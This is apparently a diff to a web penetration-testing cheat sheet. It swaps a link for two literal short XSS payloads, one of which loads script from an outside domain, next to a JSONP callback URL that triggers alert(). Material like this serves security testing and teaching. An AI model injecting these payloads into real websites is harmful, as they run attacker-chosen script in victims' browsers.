@@ -722,7 +722,11 @@ Manually testing for XXE vulnerabilities generally involves
 - https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
 - [JSFuck](http://www.jsfuck.com/)
 - [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
-- [Shortest rXSS possible](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
+- Short XSS payloads
+  ```
+  <svg/onload=alert()>
+  <script/src=//⑮.rs
+  ```
 - If Privileges are required, see if you can chain the XSS with a [CSRF](#cross-site-request-forgery-csrf)
 
 ### CSP
